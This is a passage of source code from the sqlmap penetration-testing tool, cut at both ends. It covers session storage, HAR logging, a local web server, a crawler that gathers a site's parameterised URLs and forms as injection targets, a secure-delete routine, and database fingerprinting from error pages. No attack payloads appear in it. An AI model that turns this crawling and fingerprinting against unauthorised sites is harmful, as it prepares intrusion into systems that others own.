HASHDB_RETRIEVE_RETRIES\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import getCurrentThreadName\nfrom thirdparty import six\n\nclass HashDB(object):\n    def __init__(self, filepath):\n        self.filepath = filepath\n        self._write_cache = {}\n        self._cache_lock = threading.Lock()\n        self._connections = []\n\n    def _get_cursor(self):\n        threadData = getCurrentThreadData()\n\n        if threadData.hashDBCursor is None:\n            try:\n                connection = sqlite3.connect(self.filepath, timeout=3, isolation_level=None)\n                self._connections.append(connection)\n                threadData.hashDBCursor = connection.cursor()\n                threadData.hashDBCursor.execute(\"CREATE TABLE IF NOT EXISTS storage (id INTEGER PRIMARY KEY, value TEXT)\")\n                connection.commit()\n            except Exception as ex:\n                errMsg = \"error occurred while opening a session \"\n                errMsg += \"file '%s' ('%s')\" % (self.filepath, getSafeExString(ex))\n                raise SqlmapConnectionException(errMsg)\n\n        return threadData.hashDBCursor\n\n    def _set_cursor(self, cursor):\n        threadData = getCurrentThreadData()\n        threadData.hashDBCursor = cursor\n\n    cursor = property(_get_cursor, _set_cursor)\n\n    def close(self):\n        threadData = getCurrentThreadData()\n        try:\n            if threadData.hashDBCursor:\n                threadData.hashDBCursor.connection.commit()\n                threadData.hashDBCursor.close()\n                threadData.hashDBCursor.connection.close()\n                threadData.hashDBCursor = None\n        except:\n            pass\n\n    def closeAll(self):\n        for connection in self._connections:\n            try:\n                connection.commit()\n                connection.close()\n            except:\n                pass\n\n    @staticmethod\n    def hashKey(key):\n        key = getBytes(key if isinstance(key, six.text_type) else repr(key), errors=\"xmlcharrefreplace\")\n        retVal = int(hashlib.md5(key).hexdigest(), 16) & 0x7fffffffffffffff  # Reference: http://stackoverflow.com/a/4448400\n        return retVal\n\n    def retrieve(self, key, unserialize=False):\n        retVal = None\n\n        if key and (self._write_cache or os.path.isfile(self.filepath)):\n            hash_ = HashDB.hashKey(key)\n            retVal = self._write_cache.get(hash_)\n            if not retVal:\n                for _ in xrange(HASHDB_RETRIEVE_RETRIES):\n                    try:\n                        for row in self.cursor.execute(\"SELECT value FROM storage WHERE id=?\", (hash_,)):\n                            retVal = row[0]\n                    except (sqlite3.OperationalError, sqlite3.DatabaseError) as ex:\n                        if any(_ in getSafeExString(ex) for _ in (\"locked\", \"no such table\")):\n                            warnMsg = \"problem occurred while accessing session file '%s' ('%s')\" % (self.filepath, getSafeExString(ex))\n                            singleTimeWarnMessage(warnMsg)\n                        elif \"Could not decode\" in getSafeExString(ex):\n                            break\n                        else:\n                            errMsg = \"error occurred while accessing session file '%s' ('%s'). \" % (self.filepath, getSafeExString(ex))\n                            errMsg += \"If the problem persists please rerun with '--flush-session'\"\n                            raise SqlmapConnectionException(errMsg)\n                    else:\n                        break\n\n                    time.sleep(1)\n\n        if retVal and unserialize:\n            try:\n                retVal = unserializeObject(retVal)\n            except:\n                retVal = None\n                warnMsg = \"error occurred while unserializing value for session key '%s'. \" % key\n                warnMsg += \"If the problem persists please rerun with '--flush-session'\"\n                logger.warning(warnMsg)\n\n        return retVal\n\n    def write(self, key, value, serialize=False):\n        if key:\n            hash_ = HashDB.hashKey(key)\n            self._cache_lock.acquire()\n            self._write_cache[hash_] = getUnicode(value) if not serialize else serializeObject(value)\n            self._cache_lock.release()\n\n        if getCurrentThreadName() in ('0', \"MainThread\"):\n            self.flush()\n\n    def flush(self, forced=False):\n        if not self._write_cache:\n            return\n\n        if not forced and len(self._write_cache) < HASHDB_FLUSH_THRESHOLD:\n            return\n\n        self._cache_lock.acquire()\n        _ = self._write_cache\n        self._write_cache = {}\n        self._cache_lock.release()\n\n        try:\n            self.beginTransaction()\n            for hash_, value in _.items():\n                retries = 0\n                while True:\n                    try:\n                        try:\n                            self.cursor.execute(\"INSERT INTO storage VALUES (?, ?)\", (hash_, value,))\n                        except sqlite3.IntegrityError:\n                            self.cursor.execute(\"UPDATE storage SET value=? WHERE id=?\", (value, hash_,))\n                    except (UnicodeError, OverflowError):  # e.g. surrogates not allowed (Issue #3851)\n                        break\n                    except sqlite3.DatabaseError as ex:\n                        if not os.path.exists(self.filepath):\n                            debugMsg = \"session file '%s' does not exist\" % self.filepath\n                            logger.debug(debugMsg)\n                            break\n\n                        if retries == 0:\n                            warnMsg = \"there has been a problem while writing to \"\n                            warnMsg += \"the session file ('%s')\" % getSafeExString(ex)\n                            logger.warning(warnMsg)\n\n                        if retries >= HASHDB_FLUSH_RETRIES:\n                            return\n                        else:\n                            retries += 1\n                            time.sleep(1)\n                    else:\n                        break\n        finally:\n            self.endTransaction()\n\n    def beginTransaction(self):\n        threadData = getCurrentThreadData()\n        if not threadData.inTransaction:\n            try:\n                self.cursor.execute(\"BEGIN TRANSACTION\")\n            except:\n                try:\n                    # Reference: http://stackoverflow.com/a/25245731\n                    self.cursor.close()\n                except sqlite3.ProgrammingError:\n                    pass\n                threadData.hashDBCursor = None\n                self.cursor.execute(\"BEGIN TRANSACTION\")\n            finally:\n                threadData.inTransaction = True\n\n    def endTransaction(self):\n        threadData = getCurrentThreadData()\n        if threadData.inTransaction:\n            retries = 0\n            while retries < HASHDB_END_TRANSACTION_RETRIES:\n                try:\n                    self.cursor.execute(\"END TRANSACTION\")\n                    threadData.inTransaction = False\n                except sqlite3.OperationalError:\n                    pass\n                except sqlite3.ProgrammingError:\n                    self.cursor = None\n                    threadData.inTransaction = False\n                    return\n                else:\n                    return\n\n                retries += 1\n                time.sleep(1)\n\n            try:\n                self.cursor.execute(\"ROLLBACK TRANSACTION\")\n            except sqlite3.OperationalError:\n                self.cursor.close()\n                self.cursor = None\n            finally:\n                threadData.inTransaction = False\n", "lib/utils/har.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport base64\nimport datetime\nimport io\nimport re\nimport time\n\nfrom lib.core.bigarray import BigArray\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.settings import VERSION\nfrom thirdparty.six.moves import BaseHTTPServer as _BaseHTTPServer\nfrom thirdparty.six.moves import http_client as _http_client\n\n# Reference: https://dvcs.w3.org/hg/webperf/raw-file/tip/specs/HAR/Overview.html\n#            http://www.softwareishard.com/har/viewer/\n\nclass HTTPCollectorFactory(object):\n    def __init__(self, harFile=False):\n        self.harFile = harFile\n\n    def create(self):\n        return HTTPCollector()\n\nclass HTTPCollector(object):\n    def __init__(self):\n        self.messages = BigArray()\n        self.extendedArguments = {}\n\n    def setExtendedArguments(self, arguments):\n        self.extendedArguments = arguments\n\n    def collectRequest(self, requestMessage, responseMessage, startTime=None, endTime=None):\n        self.messages.append(RawPair(requestMessage, responseMessage,\n                                     startTime=startTime, endTime=endTime,\n                                     extendedArguments=self.extendedArguments))\n\n    def obtain(self):\n        return {\"log\": {\n            \"version\": \"1.2\",\n            \"creator\": {\"name\": \"sqlmap\", \"version\": VERSION},\n            \"entries\": [pair.toEntry().toDict() for pair in self.messages],\n        }}\n\nclass RawPair(object):\n    def __init__(self, request, response, startTime=None, endTime=None, extendedArguments=None):\n        self.request = getBytes(request)\n        self.response = getBytes(response)\n        self.startTime = startTime\n        self.endTime = endTime\n        self.extendedArguments = extendedArguments or {}\n\n    def toEntry(self):\n        return Entry(request=Request.parse(self.request), response=Response.parse(self.response),\n                     startTime=self.startTime, endTime=self.endTime,\n                     extendedArguments=self.extendedArguments)\n\nclass Entry(object):\n    def __init__(self, request, response, startTime, endTime, extendedArguments):\n        self.request = request\n        self.response = response\n        self.startTime = startTime or 0\n        self.endTime = endTime or 0\n        self.extendedArguments = extendedArguments\n\n    def toDict(self):\n        out = {\n            \"request\": self.request.toDict(),\n            \"response\": self.response.toDict(),\n            \"cache\": {},\n            \"timings\": {\n                \"send\": -1,\n                \"wait\": -1,\n                \"receive\": -1,\n            },\n            \"time\": int(1000 * (self.endTime - self.startTime)),\n            \"startedDateTime\": \"%s%s\" % (datetime.datetime.fromtimestamp(self.startTime).isoformat(), time.strftime(\"%z\")) if self.startTime else None\n        }\n        out.update(self.extendedArguments)\n        return out\n\nclass Request(object):\n    def __init__(self, method, path, httpVersion, headers, postBody=None, raw=None, comment=None):\n        self.method = method\n        self.path = path\n        self.httpVersion = httpVersion\n        self.headers = headers or {}\n        self.postBody = postBody\n        self.comment = comment.strip() if comment else comment\n        self.raw = raw\n\n    @classmethod\n    def parse(cls, raw):\n        request = HTTPRequest(raw)\n        return cls(method=request.command,\n                   path=request.path,\n                   httpVersion=request.request_version,\n                   headers=request.headers,\n                   postBody=request.rfile.read(),\n                   comment=request.comment,\n                   raw=raw)\n\n    @property\n    def url(self):\n        host = self.headers.get(\"Host\", \"unknown\")\n        return \"http://%s%s\" % (host, self.path)\n\n    def toDict(self):\n        out = {\n            \"httpVersion\": self.httpVersion,\n            \"method\": self.method,\n            \"url\": self.url,\n            \"headers\": [dict(name=key.capitalize(), value=value) for key, value in self.headers.items()],\n            \"cookies\": [],\n            \"queryString\": [],\n            \"headersSize\": -1,\n            \"bodySize\": -1,\n            \"comment\": getText(self.comment),\n        }\n\n        if self.postBody:\n            contentType = self.headers.get(\"Content-Type\")\n            out[\"postData\"] = {\n                \"mimeType\": contentType,\n                \"text\": getText(self.postBody).rstrip(\"\\r\\n\"),\n            }\n\n        return out\n\nclass Response(object):\n    extract_status = re.compile(b'\\\\((\\\\d{3}) (.*)\\\\)')\n\n    def __init__(self, httpVersion, status, statusText, headers, content, raw=None, comment=None):\n        self.raw = raw\n        self.httpVersion = httpVersion\n        self.status = status\n        self.statusText = statusText\n        self.headers = headers\n        self.content = content\n        self.comment = comment.strip() if comment else comment\n\n    @classmethod\n    def parse(cls, raw):\n        altered = raw\n        comment = b\"\"\n\n        if altered.startswith(b\"HTTP response [\") or altered.startswith(b\"HTTP redirect [\"):\n            stream = io.BytesIO(raw)\n            first_line = stream.readline()\n            parts = cls.extract_status.search(first_line)\n            status_line = \"HTTP/1.0 %s %s\" % (getText(parts.group(1)), getText(parts.group(2)))\n            remain = stream.read()\n            altered = getBytes(status_line) + b\"\\r\\n\" + remain\n            comment = first_line\n\n        response = _http_client.HTTPResponse(FakeSocket(altered))\n        response.begin()\n\n        try:\n            content = response.read()\n        except _http_client.IncompleteRead:\n            content = raw[raw.find(b\"\\r\\n\\r\\n\") + 4:].rstrip(b\"\\r\\n\")\n\n        return cls(httpVersion=\"HTTP/1.1\" if response.version == 11 else \"HTTP/1.0\",\n                   status=response.status,\n                   statusText=response.reason,\n                   headers=response.msg,\n                   content=content,\n                   comment=comment,\n                   raw=raw)\n\n    def toDict(self):\n        content = {\n            \"mimeType\": self.headers.get(\"Content-Type\"),\n            \"text\": self.content,\n            \"size\": len(self.content or \"\")\n        }\n\n        binary = set([b'\\0', b'\\1'])\n        if any(c in binary for c in self.content):\n            content[\"encoding\"] = \"base64\"\n            content[\"text\"] = getText(base64.b64encode(self.content))\n        else:\n            content[\"text\"] = getText(content[\"text\"])\n\n        return {\n            \"httpVersion\": self.httpVersion,\n            \"status\": self.status,\n            \"statusText\": self.statusText,\n            \"headers\": [dict(name=key.capitalize(), value=value) for key, value in self.headers.items() if key.lower() != \"uri\"],\n            \"cookies\": [],\n            \"content\": content,\n            \"headersSize\": -1,\n            \"bodySize\": -1,\n            \"redirectURL\": \"\",\n            \"comment\": getText(self.comment),\n        }\n\nclass FakeSocket(object):\n    # Original source:\n    # https://stackoverflow.com/questions/24728088/python-parse-http-response-string\n\n    def __init__(self, response_text):\n        self._file = io.BytesIO(response_text)\n\n    def makefile(self, *args, **kwargs):\n        return self._file\n\nclass HTTPRequest(_BaseHTTPServer.BaseHTTPRequestHandler):\n    # Original source:\n    # https://stackoverflow.com/questions/4685217/parse-raw-http-headers\n\n    def __init__(self, request_text):\n        self.comment = None\n        self.rfile = io.BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n\n        if self.raw_requestline.startswith(b\"HTTP request [\"):\n            self.comment = self.raw_requestline\n            self.raw_requestline = self.rfile.readline()\n\n        self.error_code = self.error_message = None\n        self.parse_request()\n\n    def send_error(self, code, message):\n        self.error_code = code\n        self.error_message = message\n", "lib/utils/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/utils/httpd.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport mimetypes\nimport gzip\nimport os\nimport re\nimport sys\nimport threading\nimport time\nimport traceback\n\nsys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\")))\n\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.settings import VERSION_STRING\nfrom thirdparty import six\nfrom thirdparty.six.moves import BaseHTTPServer as _BaseHTTPServer\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import socketserver as _socketserver\nfrom thirdparty.six.moves import urllib as _urllib\n\nHTTP_ADDRESS = \"0.0.0.0\"\nHTTP_PORT = 8951\nDEBUG = True\nHTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"data\", \"html\"))\nDISABLED_CONTENT_EXTENSIONS = (\".py\", \".pyc\", \".md\", \".txt\", \".bak\", \".conf\", \".zip\", \"~\")\n\nclass ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\n\nclass ReqHandler(_BaseHTTPServer.BaseHTTPRequestHandler):\n    def do_GET(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")\n        params = {}\n        content = None\n\n        if query:\n            params.update(_urllib.parse.parse_qs(query))\n\n        for key in params:\n            if params[key]:\n                params[key] = params[key][-1]\n\n        self.url, self.params = path, params\n\n        if path == '/':\n            path = \"index.html\"\n\n        path = path.strip('/')\n\n        path = path.replace('/', os.path.sep)\n        path = os.path.abspath(os.path.join(HTML_DIR, path)).strip()\n\n        if not os.path.isfile(path) and os.path.isfile(\"%s.html\" % path):\n            path = \"%s.html\" % path\n\n        if \"..\" not in os.path.relpath(path, HTML_DIR) and os.path.isfile(path) and not path.endswith(DISABLED_CONTENT_EXTENSIONS):\n            content = open(path, \"rb\").read()\n            self.send_response(_http_client.OK)\n            self.send_header(HTTP_HEADER.CONNECTION, \"close\")\n            self.send_header(HTTP_HEADER.CONTENT_TYPE, mimetypes.guess_type(path)[0] or \"application/octet-stream\")\n        else:\n            content = (\"<!DOCTYPE html><html lang=\\\"en\\\"><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL %s was not found on this server.</p></body></html>\" % self.path.split('?')[0]).encode(UNICODE_ENCODING)\n            self.send_response(_http_client.NOT_FOUND)\n            self.send_header(HTTP_HEADER.CONNECTION, \"close\")\n\n        if content is not None:\n            for match in re.finditer(b\"<!(\\\\w+)!>\", content):\n                name = match.group(1)\n                _ = getattr(self, \"_%s\" % name.lower(), None)\n                if _:\n                    content = self._format(content, **{name: _()})\n\n            if \"gzip\" in self.headers.get(HTTP_HEADER.ACCEPT_ENCODING):\n                self.send_header(HTTP_HEADER.CONTENT_ENCODING, \"gzip\")\n                _ = six.BytesIO()\n                compress = gzip.GzipFile(\"\", \"w+b\", 9, _)\n                compress._stream = _\n                compress.write(content)\n                compress.flush()\n                compress.close()\n                content = compress._stream.getvalue()\n\n            self.send_header(HTTP_HEADER.CONTENT_LENGTH, str(len(content)))\n\n        self.end_headers()\n\n        if content:\n            self.wfile.write(content)\n\n        self.wfile.flush()\n\n    def _format(self, content, **params):\n        if content:\n            for key, value in params.items():\n                content = content.replace(\"<!%s!>\" % key, value)\n\n        return content\n\n    def version_string(self):\n        return VERSION_STRING\n\n    def log_message(self, format, *args):\n        return\n\n    def finish(self):\n        try:\n            _BaseHTTPServer.BaseHTTPRequestHandler.finish(self)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\n\ndef start_httpd():\n    server = ThreadingServer((HTTP_ADDRESS, HTTP_PORT), ReqHandler)\n    thread = threading.Thread(target=server.serve_forever)\n    thread.daemon = True\n    thread.start()\n\n    print(\"[i] running HTTP server at '%s:%d'\" % (HTTP_ADDRESS, HTTP_PORT))\n\nif __name__ == \"__main__\":\n    try:\n        start_httpd()\n\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        pass\n", "lib/utils/crawler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport os\nimport re\nimport tempfile\nimport time\n\nfrom lib.core.common import checkSameHost\nfrom lib.core.common import clearConsoleLine\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import findPageForms\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import openFile\nfrom lib.core.common import readInput\nfrom lib.core.common import safeCSValue\nfrom lib.core.common import urldecode\nfrom lib.core.compat import xrange\nfrom lib.core.convert import htmlUnescape\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.settings import CRAWL_EXCLUDE_EXTENSIONS\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import runThreads\nfrom lib.parse.sitemap import parseSitemap\nfrom lib.request.connect import Connect as Request\nfrom thirdparty import six\nfrom thirdparty.beautifulsoup.beautifulsoup import BeautifulSoup\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import urllib as _urllib\n\ndef crawl(target, post=None, cookie=None):\n    if not target:\n        return\n\n    try:\n        visited = set()\n        threadData = getCurrentThreadData()\n        threadData.shared.value = OrderedSet()\n        threadData.shared.formsFound = False\n\n        def crawlThread():\n            threadData = getCurrentThreadData()\n\n            while kb.threadContinue:\n                with kb.locks.limit:\n                    if threadData.shared.unprocessed:\n                        current = threadData.shared.unprocessed.pop()\n                        if current in visited:\n                            continue\n                        elif conf.crawlExclude and re.search(conf.crawlExclude, current):\n                            dbgMsg = \"skipping '%s'\" % current\n                            logger.debug(dbgMsg)\n                            continue\n                        else:\n                            visited.add(current)\n                    else:\n                        break\n\n                content = None\n                try:\n                    if current:\n                        content = Request.getPage(url=current, post=post, cookie=None, crawling=True, raise404=False)[0]\n                except SqlmapConnectionException as ex:\n                    errMsg = \"connection exception detected ('%s'). skipping \" % getSafeExString(ex)\n                    errMsg += \"URL '%s'\" % current\n                    logger.critical(errMsg)\n                except SqlmapSyntaxException:\n                    errMsg = \"invalid URL detected. skipping '%s'\" % current\n                    logger.critical(errMsg)\n                except _http_client.InvalidURL as ex:\n                    errMsg = \"invalid URL detected ('%s'). skipping \" % getSafeExString(ex)\n                    errMsg += \"URL '%s'\" % current\n                    logger.critical(errMsg)\n\n                if not kb.threadContinue:\n                    break\n\n                if isinstance(content, six.text_type):\n                    try:\n                        match = re.search(r\"(?si)<html[^>]*>(.+)</html>\", content)\n                        if match:\n                            content = \"<html>%s</html>\" % match.group(1)\n\n                        soup = BeautifulSoup(content)\n                        tags = soup('a')\n\n                        tags += re.finditer(r'(?i)\\s(href|src)=[\"\\'](?P<href>[^>\"\\']+)', content)\n                        tags += re.finditer(r'(?i)window\\.open\\([\"\\'](?P<href>[^)\"\\']+)[\"\\']', content)\n\n                        for tag in tags:\n                            href = tag.get(\"href\") if hasattr(tag, \"get\") else tag.group(\"href\")\n\n                            if href:\n                                if threadData.lastRedirectURL and threadData.lastRedirectURL[0] == threadData.lastRequestUID:\n                                    current = threadData.lastRedirectURL[1]\n                                url = _urllib.parse.urljoin(current, htmlUnescape(href))\n\n                                # flag to know if we are dealing with the same target host\n                                _ = checkSameHost(url, target)\n\n                                if conf.scope:\n                                    if not re.search(conf.scope, url, re.I):\n                                        continue\n                                elif not _:\n                                    continue\n\n                                if (extractRegexResult(r\"\\A[^?]+\\.(?P<result>\\w+)(\\?|\\Z)\", url) or \"\").lower() not in CRAWL_EXCLUDE_EXTENSIONS:\n                                    with kb.locks.value:\n                                        threadData.shared.deeper.add(url)\n                                        if re.search(r\"(.*?)\\?(.+)\", url) and not re.search(r\"\\?(v=)?\\d+\\Z\", url) and not re.search(r\"(?i)\\.(js|css)(\\?|\\Z)\", url):\n                                            threadData.shared.value.add(url)\n                    except UnicodeEncodeError:  # for non-HTML files\n                        pass\n                    except ValueError:          # for non-valid links\n                        pass\n                    except AssertionError:      # for invalid HTML\n                        pass\n                    finally:\n                        if conf.forms:\n                            threadData.shared.formsFound |= len(findPageForms(content, current, False, True)) > 0\n\n                if conf.verbose in (1, 2):\n                    threadData.shared.count += 1\n                    status = '%d/%d links visited (%d%%)' % (threadData.shared.count, threadData.shared.length, round(100.0 * threadData.shared.count / threadData.shared.length))\n                    dataToStdout(\"\\r[%s] [INFO] %s\" % (time.strftime(\"%X\"), status), True)\n\n        threadData.shared.deeper = set()\n        threadData.shared.unprocessed = set([target])\n\n        _ = re.sub(r\"(?<!/)/(?!/).*\", \"\", target)\n        if _:\n            if target.strip('/') != _.strip('/'):\n                threadData.shared.unprocessed.add(_)\n\n        if re.search(r\"\\?.*\\b\\w+=\", target):\n            threadData.shared.value.add(target)\n\n        if kb.checkSitemap is None:\n            message = \"do you want to check for the existence of \"\n            message += \"site's sitemap(.xml) [y/N] \"\n            kb.checkSitemap = readInput(message, default='N', boolean=True)\n\n        if kb.checkSitemap:\n            found = True\n            items = None\n            url = _urllib.parse.urljoin(target, \"/sitemap.xml\")\n            try:\n                items = parseSitemap(url)\n            except SqlmapConnectionException as ex:\n                if \"page not found\" in getSafeExString(ex):\n                    found = False\n                    logger.warning(\"'sitemap.xml' not found\")\n            except:\n                pass\n            finally:\n                if found:\n                    if items:\n                        for item in items:\n                            if re.search(r\"(.*?)\\?(.+)\", item):\n                                threadData.shared.value.add(item)\n                        if conf.crawlDepth > 1:\n                            threadData.shared.unprocessed.update(items)\n                    logger.info(\"%s links found\" % (\"no\" if not items else len(items)))\n\n        if not conf.bulkFile:\n            infoMsg = \"starting crawler for target URL '%s'\" % target\n            logger.info(infoMsg)\n\n        for i in xrange(conf.crawlDepth):\n            threadData.shared.count = 0\n            threadData.shared.length = len(threadData.shared.unprocessed)\n            numThreads = min(conf.threads, len(threadData.shared.unprocessed))\n\n            if not conf.bulkFile:\n                logger.info(\"searching for links with depth %d\" % (i + 1))\n\n            runThreads(numThreads, crawlThread, threadChoice=(i > 0))\n            clearConsoleLine(True)\n\n            if threadData.shared.deeper:\n                threadData.shared.unprocessed = set(threadData.shared.deeper)\n            else:\n                break\n\n    except KeyboardInterrupt:\n        warnMsg = \"user aborted during crawling. sqlmap \"\n        warnMsg += \"will use partial list\"\n        logger.warning(warnMsg)\n\n    finally:\n        clearConsoleLine(True)\n\n        if not threadData.shared.value:\n            if not (conf.forms and threadData.shared.formsFound):\n                warnMsg = \"no usable links found (with GET parameters)\"\n                if conf.forms:\n                    warnMsg += \" or forms\"\n                logger.warning(warnMsg)\n        else:\n            for url in threadData.shared.value:\n                kb.targets.add((urldecode(url, kb.pageEncoding), None, None, None, None))\n\n        if kb.targets:\n            if kb.normalizeCrawlingChoice is None:\n                message = \"do you want to normalize \"\n                message += \"crawling results [Y/n] \"\n\n                kb.normalizeCrawlingChoice = readInput(message, default='Y', boolean=True)\n\n            if kb.normalizeCrawlingChoice:\n                seen = set()\n                results = OrderedSet()\n\n                for target in kb.targets:\n                    value = \"%s%s%s\" % (target[0], '&' if '?' in target[0] else '?', target[2] or \"\")\n                    match = re.search(r\"/[^/?]*\\?.+\\Z\", value)\n                    if match:\n                        key = re.sub(r\"=[^=&]*\", \"=\", match.group(0)).strip(\"&?\")\n                        if '=' in key and key not in seen:\n                            results.add(target)\n                            seen.add(key)\n\n                kb.targets = results\n\n            storeResultsToFile(kb.targets)\n\ndef storeResultsToFile(results):\n    if not results:\n        return\n\n    if kb.storeCrawlingChoice is None:\n        message = \"do you want to store crawling results to a temporary file \"\n        message += \"for eventual further processing with other tools [y/N] \"\n\n        kb.storeCrawlingChoice = readInput(message, default='N', boolean=True)\n\n    if kb.storeCrawlingChoice:\n        handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.CRAWLER, suffix=\".csv\" if conf.forms else \".txt\")\n        os.close(handle)\n\n        infoMsg = \"writing crawling results to a temporary file '%s' \" % filename\n        logger.info(infoMsg)\n\n        with openFile(filename, \"w+b\") as f:\n            if conf.forms:\n                f.write(\"URL,POST\\n\")\n\n            for url, _, data, _, _ in results:\n                if conf.forms:\n                    f.write(\"%s,%s\\n\" % (safeCSValue(url), safeCSValue(data or \"\")))\n                else:\n                    f.write(\"%s\\n\" % url)\n", "lib/utils/purge.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport functools\nimport os\nimport random\nimport shutil\nimport stat\nimport string\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import openFile\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import logger\nfrom thirdparty.six import unichr as _unichr\n\ndef purge(directory):\n    \"\"\"\n    Safely removes content from a given directory\n    \"\"\"\n\n    if not os.path.isdir(directory):\n        warnMsg = \"skipping purging of directory '%s' as it does not exist\" % directory\n        logger.warning(warnMsg)\n        return\n\n    infoMsg = \"purging content of directory '%s'...\" % directory\n    logger.info(infoMsg)\n\n    filepaths = []\n    dirpaths = []\n\n    for rootpath, directories, filenames in os.walk(directory):\n        dirpaths.extend(os.path.abspath(os.path.join(rootpath, _)) for _ in directories)\n        filepaths.extend(os.path.abspath(os.path.join(rootpath, _)) for _ in filenames)\n\n    logger.debug(\"changing file attributes\")\n    for filepath in filepaths:\n        try:\n            os.chmod(filepath, stat.S_IREAD | stat.S_IWRITE)\n        except:\n            pass\n\n    logger.debug(\"writing random data to files\")\n    for filepath in filepaths:\n        try:\n            filesize = os.path.getsize(filepath)\n            with openFile(filepath, \"w+b\") as f:\n                f.write(\"\".join(_unichr(random.randint(0, 255)) for _ in xrange(filesize)))\n        except:\n            pass\n\n    logger.debug(\"truncating files\")\n    for filepath in filepaths:\n        try:\n            with open(filepath, 'w') as f:\n                pass\n        except:\n            pass\n\n    logger.debug(\"renaming filenames to random values\")\n    for filepath in filepaths:\n        try:\n            os.rename(filepath, os.path.join(os.path.dirname(filepath), \"\".join(random.sample(string.ascii_letters, random.randint(4, 8)))))\n        except:\n            pass\n\n    dirpaths.sort(key=functools.cmp_to_key(lambda x, y: y.count(os.path.sep) - x.count(os.path.sep)))\n\n    logger.debug(\"renaming directory names to random values\")\n    for dirpath in dirpaths:\n        try:\n            os.rename(dirpath, os.path.join(os.path.dirname(dirpath), \"\".join(random.sample(string.ascii_letters, random.randint(4, 8)))))\n        except:\n            pass\n\n    logger.debug(\"deleting the whole directory tree\")\n    try:\n        shutil.rmtree(directory)\n    except OSError as ex:\n        logger.error(\"problem occurred while removing directory '%s' ('%s')\" % (getUnicode(directory), getSafeExString(ex)))\n", "lib/parse/html.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom xml.sax.handler import ContentHandler\n\nfrom lib.core.common import urldecode\nfrom lib.core.common import parseXmlFile\nfrom lib.core.data import kb\nfrom lib.core.data import paths\nfrom lib.core.settings import HEURISTIC_PAGE_SIZE_THRESHOLD\nfrom lib.core.threads import getCurrentThreadData\n\nclass HTMLHandler(ContentHandler):\n    \"\"\"\n    This class defines methods to parse the input HTML page to\n    fingerprint the back-end database management system\n    \"\"\"\n\n    def __init__(self, page):\n        ContentHandler.__init__(self)\n\n        self._dbms = None\n        self._page = (page or \"\")\n        try:\n            self._lower_page = self._page.lower()\n        except SystemError:  # https://bugs.python.org/issue18183\n            self._lower_page = None\n        self._urldecoded_page = urldecode(self._page)\n\n        self.dbms = None\n\n    def _markAsErrorPage(self):\n        threadData = getCurrentThreadData()\n        threadData.lastErrorPage = (threadData.lastRequestUID, self._page)\n\n    def startElement(self, name, attrs):\n        if self.dbms:\n            return\n\n        if name == \"dbms\":\n            self._dbms = attrs.get(\"value\")\n\n        elif name == \"error\":\n            regexp = attrs.get(\"regexp\")\n            if regexp not in kb.cache.regex:\n                keywords = re.findall(r\"\\w+\", re.sub(r\"\\\\.\", \" \", regexp))\n                keywords = sorted(keywords, key=len)\n                kb.cache.regex[regexp] = keywords[-1].lower()\n\n            if ('|' in regexp or kb.cache.regex[regexp] in (self._lower_page or kb.cache.regex[regexp])) and re.search(regexp, self._urldecoded_page, re.I):\n                self.dbms = self._dbms\n                self._markAsErrorPage()\n                kb.forkNote = kb.forkNote or attrs.get(\"fork\")\n\ndef htmlParser(page):\n    \"\"\"\n    This function calls a class that parses the input HTML page to\n    fingerprint the back-end database management system\n\n    >>> from lib.core.enums import DBMS\n    >>> htmlParser(\"Warning: mysql_fetch_array() expects parameter 1 to be resource\") == DBMS.MYSQL\n    True\n    >>> threadData = getCurrentThreadData()\n    >>> threadData.lastErrorPage = None\n    \"\"\"\n\n    page = 